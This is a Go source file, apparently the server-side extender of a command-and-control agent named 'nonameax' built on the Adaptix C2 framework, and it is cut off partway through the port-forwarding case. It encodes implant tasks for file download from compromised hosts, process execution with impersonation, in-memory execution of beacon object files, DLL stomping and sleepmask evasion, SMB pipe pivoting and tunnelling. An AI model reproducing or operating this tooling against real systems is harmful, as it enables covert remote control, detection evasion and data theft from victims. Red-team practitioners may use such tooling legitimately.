package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

const maxPathBytes = 512


func buildPathCmd(cmdId byte, cmdName string, path string) ([]byte, error) {
	pathBytes := []byte(path)
	if len(pathBytes) > maxPathBytes {
		return nil, fmt.Errorf("nonameax: %s: path too long (max %d bytes)", cmdName, maxPathBytes)
	}
	data := make([]byte, 5+len(pathBytes))
	data[0] = cmdId
	binary.LittleEndian.PutUint32(data[1:5], uint32(len(pathBytes)))
	copy(data[5:], pathBytes)
	return data, nil
}

func buildTwoPathCmd(cmdId byte, cmdName string, src string, dst string) ([]byte, error) {
	srcBytes := []byte(src)
	dstBytes := []byte(dst)
	if len(srcBytes) > maxPathBytes || len(dstBytes) > maxPathBytes {
		return nil, fmt.Errorf("nonameax: %s: path too long (max %d bytes)", cmdName, maxPathBytes)
	}
	argsLen := len(srcBytes) + 1 + len(dstBytes)
	data := make([]byte, 5+argsLen)
	data[0] = cmdId
	binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
	copy(data[5:], srcBytes)
	data[5+len(srcBytes)] = 0x00
	copy(data[5+len(srcBytes)+1:], dstBytes)
	return data, nil
}

func buildPathCmdFlags(cmdId byte, cmdName string, path string, recursive bool) ([]byte, error) {
	pathBytes := []byte(path)
	if len(pathBytes) > maxPathBytes {
		return nil, fmt.Errorf("nonameax: %s: path too long (max %d bytes)", cmdName, maxPathBytes)
	}
	flags := byte(0x00)
	if recursive {
		flags = 0x01
	}
	data := make([]byte, 5+1+len(pathBytes))
	data[0] = cmdId
	binary.LittleEndian.PutUint32(data[1:5], uint32(1+len(pathBytes)))
	data[5] = flags
	copy(data[6:], pathBytes)
	return data, nil
}

func formatSleepMs(ms uint32) string {
	if ms == 0 {
		return "0s"
	}
	if ms < 1000 {
		return fmt.Sprintf("%dms", ms)
	}
	if ms%1000 == 0 {
		return fmt.Sprintf("%ds", ms/1000)
	}
	return fmt.Sprintf("%.1fs", float64(ms)/1000.0)
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	command, _ := args["command"].(string)
	subcommand, _ := args["subcommand"].(string)

	// Task data layout (all commands):
	//   cmd_id(1) | args_len(4LE) | args...
	// args_len uses 4 bytes to support BOF payloads > 64 KB (e.g. 300 KB privcheck).

	switch command {
	case "whoami":
		task := adaptix.TaskData{
			Type: taskTypeTask,
			Data: []byte{CMD_WHOAMI, 0x00, 0x00, 0x00, 0x00},
			Sync: true,
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "whoami task queued"}
		return task, msg, nil

	case "sleep":
		sleepStr, _ := args["sleep"].(string)
		if sleepStr == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: sleep: 'sleep' argument required")
		}
		var sleepMs int64
		if n, err := strconv.ParseInt(sleepStr, 10, 64); err == nil {
			sleepMs = n * 1000
		} else if d, err := time.ParseDuration(sleepStr); err == nil {
			sleepMs = d.Milliseconds()
		} else {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: sleep: must be seconds (e.g. 10) or duration (e.g. 500ms, 1.5s, 1m30s)")
		}
		if sleepMs < 0 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: sleep: value must be ≥ 0")
		}
		jitterPct := 0
		if jv, ok := args["jitter"].(float64); ok {
			jitterPct = int(jv)
		}
		if jitterPct < 0 || jitterPct > 100 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: sleep: jitter must be 0–100")
		}
		// cmd_id(1) | args_len(4LE)=5 | sleep_ms(4LE) | jitter(1)
		data := make([]byte, 10)
		data[0] = CMD_SLEEP
		binary.LittleEndian.PutUint32(data[1:5], 5)
		binary.LittleEndian.PutUint32(data[5:9], uint32(sleepMs))
		data[9] = byte(jitterPct)
		var msgText string
		if jitterPct > 0 {
			msgText = fmt.Sprintf("sleep set to %s (jitter %d%%)", formatSleepMs(uint32(sleepMs)), jitterPct)
		} else {
			msgText = fmt.Sprintf("sleep set to %s", formatSleepMs(uint32(sleepMs)))
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: msgText}
		return task, msg, nil

	case "terminate":
		switch subcommand {
		case "thread":
			task := adaptix.TaskData{
				Type: taskTypeTask,
				Data: []byte{CMD_EXIT_THREAD, 0x00, 0x00, 0x00, 0x00},
				Sync: false,
			}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "terminate thread task queued"}
			return task, msg, nil
		case "process":
			task := adaptix.TaskData{
				Type: taskTypeTask,
				Data: []byte{CMD_EXIT_PROC, 0x00, 0x00, 0x00, 0x00},
				Sync: false,
			}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "terminate process task queued"}
			return task, msg, nil
		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: terminate: subcommand must be 'thread' or 'process'")
		}

	case "cd":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: cd: 'path' argument required")
		}
		data, err := buildPathCmd(CMD_CD, "cd", path)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("cd to %s task queued", path)}
		return task, msg, nil

	case "pwd":
		task := adaptix.TaskData{
			Type: taskTypeTask,
			Data: []byte{CMD_PWD, 0x00, 0x00, 0x00, 0x00},
			Sync: true,
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "pwd task queued"}
		return task, msg, nil

	case "mkdir":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: mkdir: 'path' argument required")
		}
		data, err := buildPathCmd(CMD_MKDIR, "mkdir", path)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("mkdir %s task queued", path)}
		return task, msg, nil

	case "rmdir":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: rmdir: 'path' argument required")
		}
		rf, _ := args["-rf"].(bool)
		data, err := buildPathCmdFlags(CMD_RMDIR, "rmdir", path, rf)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
		}
		label := fmt.Sprintf("rmdir %s task queued", path)
		if rf {
			label = fmt.Sprintf("rmdir -rf %s task queued", path)
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: label}
		return task, msg, nil

	case "rm":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: rm: 'path' argument required")
		}
		rf, _ := args["-rf"].(bool)
		data, err := buildPathCmdFlags(CMD_RM, "rm", path, rf)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
		}
		label := fmt.Sprintf("rm %s queued", path)
		if rf {
			label = fmt.Sprintf("rm -rf %s queued", path)
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: label}
		return task, msg, nil

	case "cp":
		src, _ := args["src"].(string)
		dst, _ := args["dst"].(string)
		if src == "" || dst == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: cp: 'src' and 'dst' arguments required")
		}
		data, err := buildTwoPathCmd(CMD_CP, "cp", src, dst)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("cp %s -> %s queued", src, dst)}
		return task, msg, nil

	case "mv":
		src, _ := args["src"].(string)
		dst, _ := args["dst"].(string)
		if src == "" || dst == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: mv: 'src' and 'dst' arguments required")
		}
		data, err := buildTwoPathCmd(CMD_MV, "mv", src, dst)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("mv %s -> %s queued", src, dst)}
		return task, msg, nil

	case "cat":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: cat: 'path' argument required")
		}
		data, err := buildPathCmd(CMD_CAT, "cat", path)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("cat %s task queued", path)}
		return task, msg, nil

	case "ls":
		path, _ := args["path"].(string)
		recursive := false
		if r, ok := args["-r"].(bool); ok {
			recursive = r
		}
		data, err := buildPathCmdFlags(CMD_LS, "ls", path, recursive)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
		}
		lsMsg := "ls (current directory) task queued"
		if recursive && path != "" {
			lsMsg = fmt.Sprintf("ls -r %s task queued", path)
		} else if recursive {
			lsMsg = "ls -r (current directory) task queued"
		} else if path != "" {
			lsMsg = fmt.Sprintf("ls %s task queued", path)
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: lsMsg}
		return task, msg, nil

	case "screenshot":
		task := adaptix.TaskData{
			Type: taskTypeTask,
			Data: []byte{CMD_SCREENSHOT, 0x00, 0x00, 0x00, 0x00},
			Sync: true,
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "screenshot queued"}
		return task, msg, nil

	case "download":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: download: 'path' argument required")
		}
		dlChunkSize := 0
		if csRaw, ok := args["chunk_size"].(string); ok && csRaw != "" {
			parsed, csErr := parseChunkSize(csRaw)
			if csErr != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					fmt.Errorf("nonameax: download: %w", csErr)
			}
			dlChunkSize = parsed
		}
		pathBytes := []byte(path)
		data := make([]byte, 9+len(pathBytes))
		data[0] = CMD_DOWNLOAD
		binary.LittleEndian.PutUint32(data[1:5], uint32(4+len(pathBytes)))
		binary.LittleEndian.PutUint32(data[5:9], uint32(dlChunkSize))
		copy(data[9:], pathBytes)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		dlMsg := fmt.Sprintf("download %s queued", path)
		if dlChunkSize > 0 {
			dlMsg = fmt.Sprintf("download %s queued (chunk size: %s)", path, humanSize(dlChunkSize))
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: dlMsg}
		return task, msg, nil

	case "upload":
		remotePath, _ := args["remote_path"].(string)
		if remotePath == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: upload: 'remote_path' argument required")
		}
		fileB64, _ := args["file"].(string)
		if fileB64 == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: upload: 'file' argument required")
		}
		fileContent, err := base64.StdEncoding.DecodeString(fileB64)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: upload: base64 decode: %w", err)
		}

		chunkSize := UPLOAD_CHUNK_DEFAULT
		if csRaw, ok := args["chunk_size"].(string); ok && csRaw != "" {
			parsed, csErr := parseChunkSize(csRaw)
			if csErr != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					fmt.Errorf("nonameax: upload: %w", csErr)
			}
			chunkSize = parsed
		}

		numChunks := (len(fileContent) + chunkSize - 1) / chunkSize
		startUploadSession(agentData.Id, remotePath, fileContent, chunkSize)

		infoMsg := fmt.Sprintf("upload %s (%s, %d chunks @ %s) started", remotePath, humanSize(len(fileContent)), numChunks, humanSize(chunkSize))
		task := adaptix.TaskData{
			Type:        taskTypeTask,
			Completed:   true,
			FinishDate:  time.Now().Unix(),
			Sync:        true,
			MessageType: messageSeverityInfo,
			Message:     infoMsg,
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: infoMsg}
		return task, msg, nil

	case "ps":
		switch subcommand {
		case "list":
			task := adaptix.TaskData{
				Type: taskTypeTask,
				Data: []byte{CMD_PS_LIST, 0x00, 0x00, 0x00, 0x00},
				Sync: true,
			}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "ps list task queued"}
			return task, msg, nil

		case "kill":
			pidVal, ok := args["pid"].(float64)
			if !ok || pidVal <= 0 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: ps kill: 'pid' argument required (positive integer)")
			}
			pid := uint32(pidVal)
			data := make([]byte, 9)
			data[0] = CMD_PS_KILL
			binary.LittleEndian.PutUint32(data[1:5], 4)
			binary.LittleEndian.PutUint32(data[5:9], pid)
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("ps kill %d task queued", pid)}
			return task, msg, nil

		case "run":
			cmdline, _ := args["args"].(string)
			if cmdline == "" {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: ps run: 'args' argument required (command line)")
			}
			var flags byte
			if v, ok := args["-o"].(bool); ok && v {
				flags |= 0x01
			}
			if v, ok := args["-s"].(bool); ok && v {
				flags |= 0x02
			}
			if v, ok := args["-i"].(bool); ok && v {
				flags |= 0x04
			}
			cmdlineBytes := []byte(cmdline)
			// beacon args: flags(1) + cmdline_len(4LE) + cmdline
			argsLen := 1 + 4 + len(cmdlineBytes)
			data := make([]byte, 5+argsLen)
			data[0] = CMD_PS_RUN
			binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
			data[5] = flags
			binary.LittleEndian.PutUint32(data[6:10], uint32(len(cmdlineBytes)))
			copy(data[10:], cmdlineBytes)
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			var parts []string
			parts = append(parts, fmt.Sprintf("ps run queued: %s", cmdline))
			if flags&0x01 != 0 {
				parts = append(parts, "output")
			}
			if flags&0x02 != 0 {
				parts = append(parts, "suspended")
			}
			if flags&0x04 != 0 {
				parts = append(parts, "impersonation")
			}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: strings.Join(parts, " | ")}
			return task, msg, nil

		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: ps: unknown subcommand %q", subcommand)
		}

	case "bof":
		bofB64, _ := args["file"].(string)
		if bofB64 == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: bof: 'file' argument required")
		}
		bofBytes, decErr := base64.StdEncoding.DecodeString(bofB64)
		if decErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: bof: base64 decode: %w", decErr)
		}
		if len(bofBytes) < 20 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: bof: file too small to be a valid COFF")
		}
		argSpec, _ := args["args"].(string)
		packedArgs, packErr := packBofArgs(argSpec)
		if packErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: bof: args pack: %w", packErr)
		}
		// Wire v2: cmd_id(1) | args_len(4LE) | async(1) | timeout(4LE) | bof_size(4LE) | bof | args_size(4LE) | args
		bofSize := len(bofBytes)
		argsSize := len(packedArgs)
		innerLen := 1 + 4 + 4 + bofSize + 4 + argsSize
		data := make([]byte, 5+innerLen)
		data[0] = CMD_BOF
		binary.LittleEndian.PutUint32(data[1:5], uint32(innerLen))
		data[5] = 0 // sync
		binary.LittleEndian.PutUint32(data[6:10], 0)
		binary.LittleEndian.PutUint32(data[10:14], uint32(bofSize))
		copy(data[14:14+bofSize], bofBytes)
		binary.LittleEndian.PutUint32(data[14+bofSize:18+bofSize], uint32(argsSize))
		if argsSize > 0 {
			copy(data[18+bofSize:], packedArgs)
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("bof queued (%d bytes COFF)", bofSize)}
		return task, msg, nil

	case "execute":
		if subcommand != "bof" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: execute: unsupported subcommand %q", subcommand)
		}

		bofB64, _ := args["bof_file"].(string)
		if bofB64 == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: execute bof: 'bof_file' argument required")
		}
		bofBytes, decErr := base64.StdEncoding.DecodeString(bofB64)
		if decErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: execute bof: base64 decode: %w", decErr)
		}
		if len(bofBytes) < 20 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: execute bof: file too small to be a valid COFF")
		}

		var packedArgs []byte
		if paramStr, ok := args["param_data"].(string); ok && paramStr != "" {
			decoded, b64Err := base64.StdEncoding.DecodeString(paramStr)
			if b64Err != nil {
				packedArgs = []byte(paramStr)
			} else {
				packedArgs = decoded
			}
		}

		asyncFlag := byte(0)
		if _, ok := args["-a"]; ok {
			asyncFlag = 1
		}
		timeoutSecs := uint32(0)
		if tVal, ok := args["timeout"].(float64); ok && tVal > 0 {
			timeoutSecs = uint32(tVal)
		}

		bofSize := len(bofBytes)
		argsSize := len(packedArgs)
		innerLen := 1 + 4 + 4 + bofSize + 4 + argsSize
		data := make([]byte, 5+innerLen)
		data[0] = CMD_BOF
		binary.LittleEndian.PutUint32(data[1:5], uint32(innerLen))
		data[5] = asyncFlag
		binary.LittleEndian.PutUint32(data[6:10], timeoutSecs)
		binary.LittleEndian.PutUint32(data[10:14], uint32(bofSize))
		copy(data[14:14+bofSize], bofBytes)
		binary.LittleEndian.PutUint32(data[14+bofSize:18+bofSize], uint32(argsSize))
		if argsSize > 0 {
			copy(data[18+bofSize:], packedArgs)
		}

		mode := "sync"
		if asyncFlag == 1 {
			mode = "async"
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{
			Status:  messageSeverityInfo,
			Message: fmt.Sprintf("execute bof queued [%s] (%d bytes COFF, %d bytes args)", mode, bofSize, argsSize),
		}
		return task, msg, nil

	case "profile":
		fileB64, _ := args["file"].(string)
		if fileB64 == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: profile: 'file' argument required")
		}
		jsonBytes, err := base64.StdEncoding.DecodeString(fileB64)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: profile: base64 decode: %w", err)
		}
		var profileJSON map[string]any
		if err := json.Unmarshal(jsonBytes, &profileJSON); err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: profile: invalid JSON: %w", err)
		}
		profCfg := parseProfileFromListenerConfig(profileJSON)
		wireBytes := EncodeProfileBodyV2(profCfg)
		// cmd_id(1) | args_len(4LE) | wire_bytes
		data := make([]byte, 5+len(wireBytes))
		data[0] = CMD_PROFILE
		binary.LittleEndian.PutUint32(data[1:5], uint32(len(wireBytes)))
		copy(data[5:], wireBytes)
		if err := saveProfileToStore(agentData.Id, profCfg); err != nil {
			naxLogErr("profile: failed to save profile to store: %v", err)
		}
		pendingProfiles.Store(agentData.Id, profCfg)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("profile update queued (%d bytes)", len(wireBytes))}
		return task, msg, nil

	case "link":
		if subcommand != "smb" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: link: subcommand must be 'smb'")
		}
		target, _ := args["target"].(string)
		pipename, _ := args["pipename"].(string)
		if target == "" || pipename == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: link smb: 'target' and 'pipename' required")
		}
		pipe := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipename)
		pipeBytes := []byte(pipe)
		// cmd_id(1)=CMD_LINK | args_len(4LE) | link_type(1) | pipename_len(4LE) | pipename
		argsLen := 1 + 4 + len(pipeBytes)
		data := make([]byte, 5+argsLen)
		data[0] = CMD_LINK
		binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
		data[5] = 1 // link_type=SMB
		binary.LittleEndian.PutUint32(data[6:10], uint32(len(pipeBytes)))
		copy(data[10:], pipeBytes)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("link smb %s queued", pipe)}
		return task, msg, nil

	case "unlink":
		pivotIdStr, _ := args["pivot_id"].(string)
		if pivotIdStr == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: unlink: 'pivot_id' required")
		}
		pivotIdVal, err := strconv.ParseUint(pivotIdStr, 16, 32)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: unlink: invalid pivot_id %q: %w", pivotIdStr, err)
		}
		// cmd_id(1)=CMD_UNLINK | args_len(4LE)=4 | pivot_id(4LE)
		data := make([]byte, 9)
		data[0] = CMD_UNLINK
		binary.LittleEndian.PutUint32(data[1:5], 4)
		binary.LittleEndian.PutUint32(data[5:9], uint32(pivotIdVal))
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("unlink %s queued", pivotIdStr)}
		return task, msg, nil

	case "job":
		switch subcommand {
		case "list":
			data := []byte{CMD_JOB_LIST, 0, 0, 0, 0}
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "listing jobs..."}
			return task, msg, nil

		case "kill":
			taskIdStr, _ := args["task_id"].(string)
			taskIdVal, parseErr := strconv.ParseUint(taskIdStr, 16, 32)
			if parseErr != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					fmt.Errorf("nonameax: job kill: invalid task ID %q", taskIdStr)
			}
			data := make([]byte, 9)
			data[0] = CMD_JOB_KILL
			binary.LittleEndian.PutUint32(data[1:5], 4)
			binary.LittleEndian.PutUint32(data[5:9], uint32(taskIdVal))
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("killing job 0x%08x...", uint32(taskIdVal))}
			return task, msg, nil

		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: job: unknown subcommand %q", subcommand)
		}

	case "watchdog":
		var enable byte
		switch strings.ToLower(subcommand) {
		case "on", "1", "true":
			enable = 1
		case "off", "0", "false":
			enable = 0
		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: watchdog: state must be 'on' or 'off'")
		}
		data := make([]byte, 6)
		data[0] = CMD_WATCHDOG_SET
		binary.LittleEndian.PutUint32(data[1:5], 1)
		data[5] = enable
		label := map[byte]string{0: "off", 1: "on"}[enable]
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{
			Status:  messageSeverityInfo,
			Message: fmt.Sprintf("watchdog %s queued", label),
		}
		return task, msg, nil

	case "bof-stomp":
		switch subcommand {
		case "sync":
			dll, _ := args["dll"].(string)
			if dll == "" {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: bof-stomp sync: 'dll' argument required")
			}
			_, doUnload := args["-unload"]
			wchars := utf16LEEncode(dll)
			// sub_cmd(1)=0x00 | wchar_len(4LE) | wchar_bytes | flags(1)
			argsLen := 1 + 4 + len(wchars) + 1
			data := make([]byte, 5+argsLen)
			data[0] = CMD_BOF_STOMP
			binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
			data[5] = 0x00
			binary.LittleEndian.PutUint32(data[6:10], uint32(len(wchars)))
			copy(data[10:], wchars)
			if doUnload {
				data[10+len(wchars)] = 0x01
			}
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("bof-stomp sync %s queued", dll)}
			return task, msg, nil

		case "async":
			dllsStr, _ := args["dlls"].(string)
			if dllsStr == "" {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: bof-stomp async: 'dlls' argument required")
			}
			_, doUnload := args["-unload"]
			dlls := strings.Split(dllsStr, ",")
			if len(dlls) > 4 {
				dlls = dlls[:4]
			}
			// sub_cmd(1)=0x01 | count(1) | [wchar_len(4LE) | wchar_bytes]... | flags(1)
			var payload []byte
			payload = append(payload, 0x01, byte(len(dlls)))
			for _, d := range dlls {
				d = strings.TrimSpace(d)
				wchars := utf16LEEncode(d)
				var lenBuf [4]byte
				binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(wchars)))
				payload = append(payload, lenBuf[:]...)
				payload = append(payload, wchars...)
			}
			var flags byte
			if doUnload {
				flags = 0x01
			}
			payload = append(payload, flags)
			data := make([]byte, 5+len(payload))
			data[0] = CMD_BOF_STOMP
			binary.LittleEndian.PutUint32(data[1:5], uint32(len(payload)))
			copy(data[5:], payload)
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("bof-stomp async [%s] queued", dllsStr)}
			return task, msg, nil

		case "show":
			data := make([]byte, 6)
			data[0] = CMD_BOF_STOMP
			binary.LittleEndian.PutUint32(data[1:5], 1)
			data[5] = 0x02
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "bof-stomp show queued"}
			return task, msg, nil

		case "sleepmask":
			dll, _ := args["dll"].(string)
			if dll == "" {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: bof-stomp sleepmask: 'dll' argument required")
			}
			_, doUnload := args["-unload"]
			wchars := utf16LEEncode(dll)
			// sub_cmd(1)=0x03 | wchar_len(4LE) | wchar_bytes | flags(1)
			argsLen := 1 + 4 + len(wchars) + 1
			data := make([]byte, 5+argsLen)
			data[0] = CMD_BOF_STOMP
			binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
			data[5] = 0x03
			binary.LittleEndian.PutUint32(data[6:10], uint32(len(wchars)))
			copy(data[10:], wchars)
			if doUnload {
				data[10+len(wchars)] = 0x01
			}
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("bof-stomp sleepmask %s queued", dll)}
			return task, msg, nil

		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: bof-stomp: unknown subcommand %q", subcommand)
		}

	case "lportfwd":
		lportVal, _ := args["lport"].(float64)
		lport := int(lportVal)
		if lport < 1 || lport > 65535 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: lportfwd: port must be 1-65535")
		}

		taskData := adaptix.TaskData{Type: adaptix.TASK_TYPE_TUNNEL}
		var msg adaptix.ConsoleMessageData

		switch subcommand {
		case "start":
			lhost, _ := args["lhost"].(string)
			fwdhost, _ := args["fwdhost"].(string)
			fwdportVal, _ := args["fwdport"].(float64)
			fwdport := int(fwdportVal)
			if lhost == "" || fwdhost == "" {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: lportfwd start: lhost and fwdhost required")
			}
			if fwdport < 1 || fwdport > 65535 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: lportfwd start: fwdport must be 1-65535")
			}
			tunnelId, err := Ts.TsTunnelCreateLportfwd(agentData.Id, "", lhost, lport, fwdhost, fwdport)
			if err != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
			}
